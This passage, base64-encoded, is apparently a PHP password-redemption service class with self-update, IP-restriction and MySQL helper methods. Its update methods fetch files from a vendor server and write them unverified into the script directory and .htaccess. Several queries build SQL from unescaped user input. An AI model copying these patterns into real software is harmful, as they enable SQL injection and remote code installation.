7CgkJCgkJaWYoJHRoaXMtPlF1ZXJ5KCRzdHJTUUwpICYmICR0aGlzLT5OdW1Sb3dzKCkpewoJCQkKCQkJJGFyclBhc3N3b3JkQ291bnQgPSAkdGhpcy0+R2V0QXJyYXkoKTsKCQkJCgkJCSRpbnRQYXNzd29yZENvdW50ID0gJGFyclBhc3N3b3JkQ291bnRbJ3RvdGFsUGFzc3dvcmRzJ107CgkJfQoJCQoJCXJldHVybiAkaW50UGFzc3dvcmRDb3VudDsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IHRoZSBjdXJyZW50IHZlcnNpb24gb2YgdGhlICcuaHRhY2Nlc3MnIGZpbGUgb24gcHJvdGVjdGluZyB0aGUgcGFzc3dvcmQgc2NyaXB0IG9uIHRoZSBjbGllbnRzIHNlcnZlciBzbyB3ZSBjYW4gaXNzdWUgdXBkYXRlcyBpZiBuZXNzYXNlcnkKCSAqIEB1c2VzIEZpbGUgQWNjZXNzCgkgKiAKCSAqIEByZXR1cm4gc3RyaW5nIHJldHVybnMgdGhlIGN1cnJlbnQgdmVyc2lvbiBudW1iZXIgYXMgYSBzdHJpbmcKCSAqLwoJZnVuY3Rpb24gR2V0SXBWZXJzaW9uKCl7CgkJCgkJJHN0cklwVmVyc2lvbiA9ICJVbmtub3duIjsKCQkKCQlpZigkdGhpcy0+Q2hlY2tTZWN1cml0eSgpKXsKCgkJCSRzdHJIVEFjY2Vzc0RhdGEgPSBmaWxlX2dldF9jb250ZW50cygnLmh0YWNjZXNzJyk7CgkJCQoJCQkvKiogQG5vdGUgR2V0IHRoZSBzZXR1cCBkYXRlIG9mIHRoZSByZW1vdGUgc3lzdGVtICovCgkJCXByZWdfbWF0Y2goIiNcI3ZlcnNpb24oLio/KVxuI3NtIiwkc3RySFRBY2Nlc3NEYXRhLCAkYXJySXBWZXJzaW9uKTsKCQkJCgkJCWlmKCFlbXB0eSgkYXJySXBWZXJzaW9uWzFdKSl7CgkJCQkKCQkJCSRzdHJJcFZlcnNpb24gPSB0cmltKCRhcnJJcFZlcnNpb25bMV0pOwoJCQl9CgkJCQoJCX0KCQkKCQlyZXR1cm4gJHN0cklwVmVyc2lvbjsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQ2hlY2tzIHRoYXQgdGhlICcuaHRhY2Nlc3MnIHByb3RlY3Rpb24gZXhpc3RzLCB0byBwcm90ZWN0IHVuYXV0aG9yaXNlZCBwYXNzd29yZCBtYW5pcHVsYXRpb24KCSAqIEB1c2VzIEZpbGUgQWNjZXNzCgkgKiAKCSAqIEByZXR1cm4gYm9vbGVhbiBDbGllbnRzIHN5c3RlbSBwcm90ZWN0ZWQgJ3RydWUnCgkgKi8KCWZ1bmN0aW9uIENoZWNrU2VjdXJpdHkoKXsKCQkKCQkkYmxQYXNzU2VjdXJpdHlDaGVjayA9IGZhbHNlOwoJCQoJCWlmKGZpbGVfZXhpc3RzKCcuaHRhY2Nlc3MnKSl7CgkJCQoJCQkkYmxQYXNzU2VjdXJpdHlDaGVjayA9IHRydWU7CgkJfQoJCQoJCXJldHVybiAkYmxQYXNzU2VjdXJpdHlDaGVjazsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQSBtZXRob2QgdG8gdXBkYXRlIHRoZSBJUCByZXN0cmljdGlvbiBmaWxlcyB3aGVuIHJlcXVpcmVkCgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKi8KCWZ1bmN0aW9uIFVwZGF0ZUlwUmVzdHJpY3Rpb24oKXsKCQkKCQkkc3RyQ3VycmVudFZlcnNpb24gPSAkdGhpcy0+R2V0SXBWZXJzaW9uKCk7CgkJCgkJJHN0ck5ld0RhdGEgPSBmaWxlX2dldF9jb250ZW50cygiaHR0cHM6Ly9zZWN1cmUudHh0bmF0aW9uLmNvbS9tZW5hYmxlL3VwZGF0ZV9pcC5jbGFzcy5waHA/Y3VycmVudD17JHN0ckN1cnJlbnRWZXJzaW9ufSIpOwoJCQoJCS8qKiBAbm90ZSBHZXQgdGhlIGlwIHVwZGF0ZSByZXNwb25zZSAqLwoJCXByZWdfbWF0Y2goIiM8cmVzcG9uc2U+KC4qPyk8XC9yZXNwb25zZT4jc20iLCRzdHJOZXdEYXRhLCAkYXJyUmVzcG9uc2VUeXBlKTsKCQkKCQlpZigkYXJyUmVzcG9uc2VUeXBlWzFdID09ICJVUERBVEUiKXsKCQkJCgkJCS8qKiBAbm90ZSBHZXQgdGhlIG5ldyBJUCB1cGRhdGUgZmlsZSAqLwoJCQlwcmVnX21hdGNoKCIjPGZpbGU+KC4qPyk8XC9maWxlPiNzbSIsJHN0ck5ld0RhdGEsICRzdHJOZXdBY2Nlc3NEYXRhKTsKCQkJCgkJCSRyZXNJcEZpbGUgPSBmb3BlbignLmh0YWNjZXNzJywndycpOwoJCQkKCQkJZndyaXRlKCRyZXNJcEZpbGUsJHN0ck5ld0FjY2Vzc0RhdGFbMV0pOwoJCQkKCQkJZmNsb3NlKCRyZXNJcEZpbGUpOwoJCQkKCQkJLyoqIEBub3RlIFJldHVybiBzdWNjZXNzIHJlc3BvbnNlICdVUERBVEVEJyB0byBhY2tub3dsZWRnZSB0aGUgc2VjdXJpdHkgc3lzdGVtIGhhcyBiZWVuIHVwZGF0ZWQgKi8KCQkJJHRoaXMtPlNjcmlwdFN1Y2Nlc3MoIlVQREFURUQiKTsKCQl9ZWxzZWlmKCRhcnJSZXNwb25zZVR5cGVbMV0gPT0gIlVQVE9EQVRFIil7CgkJCQoJCQkvKiogQG5vdGUgUmV0dXJuIHN1Y2Nlc3MgcmVzcG9uc2UgJ05PVFJFUVVJUkVEJyB0byBhY2tub3dsZWRnZSB0aGUgc2VjdXJpdHkgc3lzdGVtIGlzIGFscmVhZHkgdXAtdG8tZGF0ZSAqLwoJCQkkdGhpcy0+U2NyaXB0U3VjY2VzcygiTk9UUkVRVUlSRUQiKTsKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDEyJyAqLwoJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAxMyIpOwoJCX0KCQkKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQSBtZXRob2QgdG8gdXBkYXRlIHRoZSBtYWluIHNlcnZpY2Ugc2NyaXB0IG9uIHJlcXVlc3QKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqLwoJZnVuY3Rpb24gVXBkYXRlU2VydmljZSgpewoJCQoJCSRzdHJDdXJyZW50VmVyc2lvbiA9ICR0aGlzLT5zdHJWZXJzaW9uOwoJCQoJCSRzdHJOZXdEYXRhID0gZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vc2VjdXJlLnR4dG5hdGlvbi5jb20vbWVuYWJsZS91cGRhdGVfc2VydmljZS5jbGFzcy5waHA/Y3VycmVudD17JHN0ckN1cnJlbnRWZXJzaW9ufSIpOwoJCQoJCS8qKiBAbm90ZSBHZXQgdGhlIFNlcnZpY2UgdXBkYXRlIHJlc3BvbnNlICovCgkJcHJlZ19tYXRjaCgiIzxyZXNwb25zZT4oLio/KTxcL3Jlc3BvbnNlPiNzbSIsJHN0ck5ld0RhdGEsICRhcnJSZXNwb25zZVR5cGUpOwoJCQoJCWlmKCRhcnJSZXNwb25zZVR5cGVbMV0gPT0gIlVQREFURSIpewoJCQkKCQkJLyoqIEBub3RlIEdldCB0aGUgbmV3IFNlcnZpY2UgdXBkYXRlIGZpbGUgKi8KCQkJcHJlZ19tYXRjaCgiIzxmaWxlbmFtZT4oLio/KTxcL2ZpbGVuYW1lPiNzbSIsJHN0ck5ld0RhdGEsICRzdHJOYW1lRGF0YSk7CgkJCQoJCQkvKiogQG5vdGUgR2V0IHRoZSBuZXcgU2VydmljZSB1cGRhdGUgZmlsZSAqLwoJCQlwcmVnX21hdGNoKCIjPGZpbGU+KC4qPyk8XC9maWxlPiNzbSIsJHN0ck5ld0RhdGEsICRzdHJOZXdBY2Nlc3NEYXRhKTsKCgkJCS8vR2V0IHRoZSBzY3JpcHQgbG9jYXRpb24KCQkJJGFyclBhcnRzID0gZXhwbG9kZSgiLyIsX19GSUxFX18pOwoJCQoJCQkkYXJyUGFydHNbY291bnQoJGFyclBhcnRzKSAtIDFdID0gbnVsbDsKCQkJCgkJCSRzdHJQYXRoID0gaW1wbG9kZSgiLyIsJGFyclBhcnRzKTsKCQkJCgkJCS8vQ3JlYXRlIHRoZSBuZXcgZmlsZQoJCQkkcmVzU2VydmljZUZpbGUgPSBmb3Blbigkc3RyUGF0aC4kc3RyTmFtZURhdGFbMV0sJ3cnKTsKCQkJCgkJCWZ3cml0ZSgkcmVzU2VydmljZUZpbGUsaHRtbF9lbnRpdHlfZGVjb2RlKCRzdHJOZXdBY2Nlc3NEYXRhWzFdKSk7CgkJCQoJCQlmY2xvc2UoJHJlc1NlcnZpY2VGaWxlKTsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3Vjc2VzcyByZXNwb25zZSAnVVBEQVRFRCcgdG8gYWNrbm93bGVkZ2UgdGhlIHNlY3VyaXR5IHN5c3RlbSBoYXMgYmVlbiB1cGRhdGVkICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJVUERBVEVEIik7CgkJCQoJCX1lbHNlaWYoJGFyclJlc3BvbnNlVHlwZVsxXSA9PSAiVVBUT0RBVEUiKXsKCQkJCgkJCS8qKiBAbm90ZSBSZXR1cm4gc3Vjc2VzcyByZXNwb25zZSAnTk9UUkVRVUlSRUQnIHRvIGFja25vd2xlZGdlIHRoZSBzZWN1cml0eSBzeXN0ZW0gaXMgYWxyZWFkeSB1cC10by1kYXRlICovCgkJCSR0aGlzLT5TY3JpcHRTdWNjZXNzKCJOT1RSRVFVSVJFRCIpOwoJCX1lbHNlewoJCQkvKiogQG5vdGUgUmV0dXJuIGVycm9yIHJlc3BvbnNlICdNUC0wMTQnICovCgkJCSR0aGlzLT5TY3JpcHRFcnJvcigiTVAtMDE0Iik7CgkJfQoJCQoJfQoJCgkvKioKCSAqIFZhbGlkYXRlIHRoZSBwYXNzd29yZCBhbmQgYSBjb3VudCBvZiB0aGUgdGltZXMgaXQgaGFzIGJlZW4gdXNlZAoJICoKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clBhc3N3b3JkCgkgKiBAcmV0dXJuIGludGVnZXIgQ291bnQgb2YgdGhlIHRpbWVzIHBhc3N3b3JkIGhhcyBiZWVuIHVzZWQKCSAqLwoJZnVuY3Rpb24gVmFsaWRhdGVQYXNzd29yZCgkc3RyUGFzc3dvcmQgPSBudWxsLCAkc3RyVXNlcm5hbWUgPSBudWxsLCAkc3RyUmVmZXJlcklEID0gbnVsbCl7CgkJCgkJJGludFVzZWFnZUNvdW50ID0gZmFsc2U7CgkJCgkJaWYoJHRoaXMtPkNoZWNrUGFzc3dvcmQoJHN0clBhc3N3b3JkKSl7CgkJCQoJCQkkc3RyRXh0cmFXaGVyZUNsYXVzZSA9ICIiOwoJCQkKCQkJaWYoIWlzX251bGwoJHN0clVzZXJuYW1lKSAmJiAkc3RyVXNlcm5hbWUgIT0gIiIpewoJCQkJJHN0ckV4dHJhV2hlcmVDbGF1c2UgLj0gIkFORCBgdXNlcm5hbWVgID0gJ3skc3RyVXNlcm5hbWV9JyI7CgkJCX0KCQkJCgkJCWlmKCFpc19udWxsKCRzdHJSZWZlcmVySUQpICYmICRzdHJSZWZlcmVySUQgIT0gIiIpewoJCQkJJHN0ckV4dHJhV2hlcmVDbGF1c2UgLj0gIkFORCBgcmVmZXJlcmAgPSAneyRzdHJSZWZlcmVySUR9JyI7CgkJCX0KCQkJCgkJCSR0aGlzLT5EYXRhYmFzZU9iamVjdCgpOwoJCQkKCQkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byBnZXQgdGhlIHN0YXR1cyBvZiBhIHBhc3N3b3JkIGluIHRoZSBwYXNzd29yZCBkYXRhYmFzZSAqLwoJCQkkc3RyU1FMID0gIlNFTEVDVCBgc3RhdHVzYAoJCQkJCQkgRlJPTSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHN0clBhc3N3b3JkfScKCQkJCQkJeyRzdHJFeHRyYVdoZXJlQ2xhdXNlfQoJCQkJCQlMSU1JVCAxIjsKCQkJCgkJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCQoJCQkJJGFyclBhc3NEYXRhID0gJHRoaXMtPkdldEFycmF5KCk7CgkJCQkKCQkJCSRpbnRVc2VhZ2VDb3VudCA9ICRhcnJQYXNzRGF0YVsnc3RhdHVzJ107CgkJCX0KCQkKCQl9CgkJCgkJcmV0dXJuICRpbnRVc2VhZ2VDb3VudDsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQWxsb3dzIHRoZSB1c2VyIHRvIHJlZGVlbSBwYXNzd29yZHMgb24gdGhlIGNsaWVudHMgc3lzdGVtLiBNdWx0aXBsZSB1c2VzIG9mIGEgcGFzc3dvcmQgaXMgYXZhaWxhYmxlIGlmIHJlcXVpcmVkCgkgKgoJICogQHBhcmFtIHN0cmluZyAkc3RyUGFzc3dvcmQKCSAqIEBwYXJhbSBpbnRlZ2VyICRpbnRNdWx0aXBsZVVzZXMKCSAqIEByZXR1cm4gYm9vbGVhbgoJICovCglmdW5jdGlvbiBVc2VQYXN3b3JkKCRzdHJQYXNzd29yZCA9IG51bGwsJGludE11bHRpcGxlVXNlcyA9IDEsICRzdHJVc2VybmFtZSA9IG51bGwsICRzdHJSZWZlcmVySUQgPSBudWxsLCAkYmxSZXF1aXJlQ29uZmlybSA9IGZhbHNlKXsKCQkKCQkkYmxTdWNjZXNzZnVseVJlZGVtZWQgPSBmYWxzZTsKCQkKCQlpZigkdGhpcy0+Q2hlY2tQYXNzd29yZCgkc3RyUGFzc3dvcmQpKXsKCQkKCQkJJHRoaXMtPkRhdGFiYXNlT2JqZWN0KCk7CgkJCQoJCQkkaW50UGFzc0NvdW50ID0gJHRoaXMtPlZhbGlkYXRlUGFzc3dvcmQoJHN0clBhc3N3b3JkKTsKCQkJCgkJCWlmKCRpbnRQYXNzQ291bnQgIT09IGZhbHNlKXsKCQkJCQoJCQkJaWYoaXNfbnVsbCgkaW50TXVsdGlwbGVVc2VzKSl7CgkJCQkJCgkJCQkJJGludE11bHRpcGxlVXNlcyA9IDE7CgkJCQl9CgkJCQkKCQkJCWlmKCRpbnRNdWx0aXBsZVVzZXMgPT0gOTk5IHx8ICRpbnRNdWx0aXBsZVVzZXMgPiAkaW50UGFzc0NvdW50KXsKCQkJCQkKCQkJCQkkYmxVcGRhdGVQYXNzd29yZFJlY29yZCA9IHRydWU7CgkJCQl9ZWxzZXsKCQkJCQkKCQkJCQkkYmxVcGRhdGVQYXNzd29yZFJlY29yZCA9IGZhbHNlOwoJCQkJfQoJCQkJCgkJCQkvL0lmIGNvbmZpcm1hdGlvbiByZXF1aXJlZCBhbmQgbm9uIGhhcyBiZWVuIGdpdmVuIHRoZW4gZG9udCBhbGxvdyB0aGUgdXNlCgkJCQlpZigkYmxSZXF1aXJlQ29uZmlybSAmJiAhJHRoaXMtPkNvbmZpcm1lZFBhc3N3b3JkKCRzdHJQYXNzd29yZCkpewoJCQkJCQoJCQkJCSRibFVwZGF0ZVBhc3N3b3JkUmVjb3JkID0gZmFsc2U7CgkJCQl9CgkJCQkKCQkJCWlmKCRibFVwZGF0ZVBhc3N3b3JkUmVjb3JkKXsKCQkJCQoJCQkJCSRzdHJFeHRyYVdoZXJlQ2xhdXNlID0gIiI7CgkJCQoJCQkJCWlmKCFpc19udWxsKCRzdHJVc2VybmFtZSkgJiYgJHN0clVzZXJuYW1lICE9ICIiKXsKCQkJCQkJJHN0ckV4dHJhV2hlcmVDbGF1c2UgLj0gIkFORCBgdXNlcm5hbWVgID0gJ3skc3RyVXNlcm5hbWV9JyI7CgkJCQkJfQoJCQkJCQoJCQkJCWlmKCFpc19udWxsKCRzdHJSZWZlcmVySUQpICYmICRzdHJSZWZlcmVySUQgIT0gIiIpewoJCQkJCQkkc3RyRXh0cmFXaGVyZUNsYXVzZSAuPSAiQU5EIGByZWZlcmVyYCA9ICd7JHN0clJlZmVyZXJJRH0nIjsKCQkJCQl9CgkJCQkJCgkJCQkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byB1c2UgYSBwYXNzd29yZCBpbiB0aGUgcGFzc3dvcmQgZGF0YWJhc2UgKi8KCQkJCQkkc3RyU1FMID0gIlVQREFURSBgeyR0aGlzLT5hcnJDb25maWdEYXRhWydkYXRhYmFzZSddfWAuYHskdGhpcy0+c3RyVGFibGVOYW1lfWAKCQkJCQkJCQkgIFNFVCBgc3RhdHVzYCA9IGBzdGF0dXNgICsgMQoJCQkJCQkJCVdIRVJFIGBwYXNzd29yZGAgPSAneyRzdHJQYXNzd29yZH0nCgkJCQkJCQkJeyRzdHJFeHRyYVdoZXJlQ2xhdXNlfQoJCQkJCQkJCUxJTUlUIDEiOwoJCQkJCQoJCQkJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+QWZmUm93cygpKXsKCQkJCQoJCQkJCQkkYmxTdWNjZXNzZnVseVJlZGVtZWQgPSB0cnVlOwoJCQkJCX0KCQkJCX0KCQkJfQoJCQoJCX0KCQkKCQlyZXR1cm4gJGJsU3VjY2Vzc2Z1bHlSZWRlbWVkOwoJfQoJCgkvKioKCSAqIEBicmllZiBDaGVja3MgdGhlIHBhc3N3b3JkIGlzIG5vdCBibGFuayBhbmQgdGhlIHBhc3N3b3JkIGlzIGF0IGxlYXN0IDYgY2hhcnMgbG9uZwoJICoKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clBhc3N3b3JkCgkgKiBAcmV0dXJuIGJvb2xlYW4KCSAqLwoJZnVuY3Rpb24gQ2hlY2tQYXNzd29yZCgkc3RyUGFzc3dvcmQpewoJCQoJCSRibFBhc3N3b3JkR29vZCA9IGZhbHNlOwoJCQoJCWlmKCFpc19udWxsKCRzdHJQYXNzd29yZCkgJiYgJHN0clBhc3N3b3JkICE9ICIiKXsKCQkJCgkJCS8qKiBAbm90ZSBQYXNzd29yZHMgbXVzdCBhdGxlYXN0IDYgY2hhcnMgbG9uZyAqKi8KCQkJaWYoc3RybGVuKCRzdHJQYXNzd29yZCkgPiA1KXsKCQkJCgkJCQkkYmxQYXNzd29yZEdvb2QgPSB0cnVlOwoJCQl9CgkJfQoJCQoJCXJldHVybiAkYmxQYXNzd29yZEdvb2Q7Cgl9CgkKCWZ1bmN0aW9uIENvbmZpcm1lZFBhc3N3b3JkKCRzdHJQYXNzd29yZCl7CgkJCgkJJGJsQ29uZmlybWVkID0gZmFsc2U7CgkJCgkJJHRoaXMtPkRhdGFiYXNlT2JqZWN0KCk7CgkJCgkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byBnZXQgdGhlIGRldGFpbHMgb2YgYSBwYXNzd29yZCBpbiB0aGUgcGFzc3dvcmQgZGF0YWJhc2UgKi8KCQkkc3RyU1FMID0gIlNFTEVDVCAqCgkJCQkJIEZST00gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHN0clBhc3N3b3JkfScKCQkJCQkgIEFORCBgY29uZmlybWVkYCA9ICcxJwoJCQkJCUxJTUlUIDEiOwoJCQoJCWlmKCR0aGlzLT5RdWVyeSgkc3RyU1FMKSAmJiAkdGhpcy0+TnVtUm93cygpKXsKCQkJCgkJCSRibENvbmZpcm1lZCA9IHRydWU7CgkJfQoJCQoJCXJldHVybiAkYmxDb25maXJtZWQ7Cgl9CgkKCS8qKgoJICogQGJyaWVmIEdldCBhbGwgZGF0YSByZWxhdGVkIHRvIHRoZSBwYXNzd29yZCBmcm9tIHRoZSBkYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gR2V0UGFzc3dvcmREYXRhKCRzdHJQYXNzd29yZCl7CgkJCgkJJHRoaXMtPkRhdGFiYXNlT2JqZWN0KCk7CgkJCgkJLyoqIEBub3RlIEJ1aWxkIHRoZSBxdWVyeSB0byBnZXQgdGhlIGRldGFpbHMgb2YgYSBwYXNzd29yZCBpbiB0aGUgcGFzc3dvcmQgZGF0YWJhc2UgKi8KCQkkc3RyU1FMID0gIlNFTEVDVCAqCgkJCQkJIEZST00gYHskdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXX1gLmB7JHRoaXMtPnN0clRhYmxlTmFtZX1gCgkJCQkJV0hFUkUgYHBhc3N3b3JkYCA9ICd7JHN0clBhc3N3b3JkfScKCQkJCQlMSU1JVCAxIjsKCQkKCQlpZigkdGhpcy0+UXVlcnkoJHN0clNRTCkgJiYgJHRoaXMtPk51bVJvd3MoKSl7CgkJCQoJCQkkYXJyUGFzc3dvcmREYXRhT3V0ID0gJHRoaXMtPkdldEFycmF5KCk7CgoJCX1lbHNlewoJCQkKCQkJJGFyclBhc3N3b3JkRGF0YU91dCA9IG51bGw7CgkJfQoJCQoJCXJldHVybiAkYXJyUGFzc3dvcmREYXRhT3V0OwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byBydW4gYSBTUUwgcXVlcnkgb24gdGhlIGNsaWVudHMgZGF0YWJhc2UKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqIEBwYXJhbSBzdHJpbmcgJHN0clNRTAoJICogQHJldHVybiBib29sZWFuIFJldHVybnMgc3RhdHVzIG9mIHRoZSBxdWVyeQoJICovCglmdW5jdGlvbiBRdWVyeSgkc3RyU1FMID0gbnVsbCl7CgkJCgkJJGJsUXVlcnlSdW4gPSBmYWxzZTsKCQkKCQkkdGhpcy0+RGF0YWJhc2VPYmplY3QoKTsKCQkKCQlpZighaXNfbnVsbCgkc3RyU1FMKSB8fCAkc3RyU1FMICE9ICIiKXsKCQkJCgkJCSRibFF1ZXJ5UnVuID0gdHJ1ZTsKCQkJCgkJCSR0aGlzLT5yZXNRdWVyeVJlc3VsdCA9IG15c3FsX3F1ZXJ5KCRzdHJTUUwsJHRoaXMtPnJlc0RiKTsKCQl9ZWxzZXsKCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDExJyAqLwoJCQkkdGhpcy0+U2NyaXB0RXJyb3IoIk1QLTAxMSIpOwoJCX0KCQkKCQlyZXR1cm4gJGJsUXVlcnlSdW4gPSB0cnVlOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byByZXR1cm4gYSBmdWxsIGFycmF5IGNvbnRhaW5pbmcgdGhlIHJlY29yZCBzZXQgZmlsbGVkIGZyb20gdGhlIGxhc3QgcXVlcnkKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiAKCSAqIEByZXR1cm4gYXJyYXkgUmV0dXJucyBhbiBhcnJheSBjb250YWluaW5nIHRoZSByZXN1bHRzIG9mIHRoZSBsYXN0IHF1ZXJ5CgkgKi8KCWZ1bmN0aW9uIEdldEFycmF5KCl7CgkJCgkJJGFyclJlc3VsdHMgPSB0cnVlOwoJCQoJCWlmKG15c3FsX251bV9yb3dzKCR0aGlzLT5yZXNRdWVyeVJlc3VsdCkpewoJCQkKICAJCQkkYXJyUmVzdWx0cyA9IG15c3FsX2ZldGNoX2FycmF5KCR0aGlzLT5yZXNRdWVyeVJlc3VsdCwgTVlTUUxfQVNTT0MpOwogIAkJCW15c3FsX2ZyZWVfcmVzdWx0KCR0aGlzLT5yZXNRdWVyeVJlc3VsdCk7CiAgCQl9CgkJCgkJcmV0dXJuICRhcnJSZXN1bHRzOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byBjaGVjayBpZiBhbnkgcmVjb3JkcyB3ZXJlIGZvdW5kIGJ5IHRoZSBsYXN0IHF1ZXJ5CgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKiBAcmV0dXJuIGludGVnZXIgUmV0dXJucyB0aGUgbnVtYmVyIG9mIHJlY29yZHMgZm91bmQKCSAqLwoJZnVuY3Rpb24gTnVtUm93cygpewoJCQoJCSRpbnRTdGF0dXMgPSBmYWxzZTsKCQkKCQlpZighaXNfbnVsbCgkdGhpcy0+cmVzUXVlcnlSZXN1bHQpKXsKCQkKCQkJaWYobXlzcWxfbnVtX3Jvd3MoJHRoaXMtPnJlc1F1ZXJ5UmVzdWx0KSA+IDApewoJCQkJCgkJCQkkaW50U3RhdHVzID0gbXlzcWxfbnVtX3Jvd3MoJHRoaXMtPnJlc1F1ZXJ5UmVzdWx0KTsKCQkJfQoJCX0KCQkKCQlyZXR1cm4gJGludFN0YXR1czsKCX0KCQoJLyoqCgkgKiBAYnJpZWYgQSBtZXRob2QgdG8gY2hlY2sgaWYgdGhlcmUgd2FzIGFueSBlZmZlY3RlZCBkYXRhYmFzZSByZWNvcmRzIGZvcm0gdGhlIGxhc3QgdXBkYXRlIHF1ZXJ5CgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKiBAcmV0dXJuIGludGVnZXIgUmV0dXJucyB0aGUgYW1vdW50IG9mIGFmZmVjdGVkIHJvd3MKCSAqLwoJZnVuY3Rpb24gQWZmUm93cygpewoJCQoJCSRpbnRBZmZlY3RlZFJvd3MgPSBmYWxzZTsKCQkKCQlpZihteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5yZXNEYikgPiAwKXsKCQkJCgkJCSRpbnRBZmZlY3RlZFJvd3MgPSBteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5yZXNEYik7CgkJfQoJCQoJCXJldHVybiAkaW50QWZmZWN0ZWRSb3dzOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIG1ldGhvZCB0byBnZXQgdGhlIGluc2VydCBJRCBvZiB0aGUgbGFzdCByZWNvcmQgdG8gYmUgYWRkZWQgdG8gdGhlIGRhdGFiYXNlCgkgKiBAdXNlcyBEYXRhYmFzZQoJICogCgkgKiBAcmV0dXJuIGludGVnZXIgUmV0dXJucyB0aGUgbGFzdCBpbnNlcnQgSUQKCSAqLwoJZnVuY3Rpb24gSW5zSWQoKXsKCQkKCQkkaW50SW5zZXJ0SUQgPSBmYWxzZTsKCQkKCQlpZihteXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5yZXNEYikgPiAwKXsKCQkJCgkJCSRpbnRJbnNlcnRJRCA9IG15c3FsX2luc2VydF9pZCgkdGhpcy0+cmVzRGIpOwoJCX0KCQkKCQlyZXR1cm4gJGludEluc2VydElEOwoJfQoJCgkvKioKCSAqIEBicmllZiBBIE1ldGhvZCB0byBpbml0aWF0ZSBhIGNvbm5lY3Rpb24gdG8gdGhlIGNsaWVudHMgZGF0YWJhc2Ugd2hlbiByZXF1aXJlZAoJICogQHVzZXMgRGF0YWJhc2UKCSAqIEBub3RlIFVzZXMgdGhlIGNvbm5lY3Rpb24gZGV0YWlscyBmb3VuZCBpbiB0aGUgJ0NsaWVudENvbmZpZy5waHAnIGZpbGUKCSAqIAoJICovCglmdW5jdGlvbiBEYXRhYmFzZU9iamVjdCgpewoJCQoJCWlmKCFpc19hcnJheSgkdGhpcy0+YXJyQ29uZmlnRGF0YSkpewoJCQkKCQkJJHRoaXMtPkdldENvbmZpZ0RhdGEoKTsKCQl9CgkJCgkJaWYoIWlzX3Jlc291cmNlKCR0aGlzLT5yZXNEYikpewoJCQoJCQkvKiogQG5vdGUgR2V0IGEgY29ubmVjdGlvbiB0byB0aGUgZGF0YWJhc2UgKi8KCQkJJHRoaXMtPnJlc0RiID0gbXlzcWxfY29ubmVjdCgkdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGJfaG9zdCddLCR0aGlzLT5hcnJDb25maWdEYXRhWydkYl91c2VybmFtZSddLCR0aGlzLT5hcnJDb25maWdEYXRhWydkYl9wYXNzd29yZCddKTsKCQkJCgkJCW15c3FsX3NlbGVjdF9kYigkdGhpcy0+YXJyQ29uZmlnRGF0YVsnZGF0YWJhc2UnXSwkdGhpcy0+cmVzRGIpOwoJCQkKCQkJaWYoIWlzX3Jlc291cmNlKCR0aGlzLT5yZXNEYikpewoJCQkJLyoqIEBub3RlIFJldHVybiBlcnJvciByZXNwb25zZSAnTVAtMDAxJyAqLwoJCQkJJHRoaXMtPlNjcmlwdEVycm9yKCJNUC0wMDEiKTsKCQkJfQoJCX0KCX0KCQoJLyoqCgkgKiBAYnJpZWYgR2V0IHRoZSBjb25maWcgZGF0YSB0byBhbGxvdyBjb25uZWN0aW9uIHRvIHRoZSBkYXRhYmFzZQoJICoKCSAqLwoJZnVuY3Rpb24gR2V0Q29uZmlnRGF0YSgpewoJCQoJCWluY2x1ZGVfb25jZSgnQ2xpZW50Q29uZmlnLnBocCcpOwoJCQkKCQkkdGhpcy0+YXJyQ29uZmlnRGF0YSA9ICRhcnJDbGllbnREYXRhOwoJfQoJCgkvKioKCSAqIEBicmllZiBFbmQgdGhlIGN1cnJlbnQgY29ubmVjdGlvbiB0byB0aGUgZGF0YWJhc2UKCSAqIEB1c2VzIERhdGFiYXNlCgkgKiBAbm90ZSBNYWtlcyBzdXJlIHRoZXJlIGlzIG5ldmVyIHRvIG1hbnkgY29ubmVjdGlvbnMgdG8gdGhlIGRhdGFiYXNlCgkgKiAKCSAqLwoJZnVuY3Rpb24gRW5kU2Vzc2lvbigpewoJCQoJCWlmKGlz